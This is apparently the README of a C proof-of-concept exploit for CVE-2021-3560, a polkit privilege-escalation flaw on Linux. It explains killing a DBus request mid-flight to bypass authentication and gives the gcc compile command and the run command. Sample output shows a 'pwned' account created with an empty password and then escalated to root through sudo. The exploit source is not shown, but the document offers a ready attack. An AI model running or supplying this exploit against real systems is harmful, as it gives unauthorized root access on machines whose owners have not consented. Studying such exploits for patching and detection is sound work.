# CVE-2021-3560
a reliable C based exploit for CVE-2021-3560.

# the PoC:
Yestreday i stumbled up on this [blog post](https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/) by Kevin Backhouse (discovered this vulnerability), i tried the bash commands provided in the blogpost and to my surpise it worked on my kali linux box!

I decided to write a PoC using dbus C API, i didn't use `sleep()` while waiting for the message to be sent to the target service, instead, DBus functions provide a timeout paramter, so by (ab)using this parameter we can force the function to return just after it sends the message, then killing the process, this will allow us to exploit the vulnerability on polkit and bypass the authentication whithout need of ssh. refer to this [blog post](https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/) for the technical details.

# run:
1. compile the exploit:

```
user@host: gcc -Wall exploit.c -o exploit $(pkg-config --libs --cflags dbus-1)
```
2. run the exploit:

```
user@host: ./exploit
```


- Output:
```
user@host:~/CVE-2021-3560-testing$ gcc -Wall exploit.c -o exploit $(pkg-config --libs --cflags dbus-1)
user@host:~/CVE-2021-3560-testing$ ./exploit
[*] creating "pwned" user ...
[!] user has been created!
[*] user: pwned, uid: 1035
[*] setting an empty password for "pwned" user
[*] setting password for "pwned" user has been done
[!] if you are asked to enter a password then there is a failure, try again!
[!] run: "sudo su root" as "pwned" user to get root
┌──(pwned㉿host)-[/home]
└─$ sudo su root
root@host:/home/CVE-2021-3560-testing# id
uid=0(root) gid=0(root) groups=0(root)
```

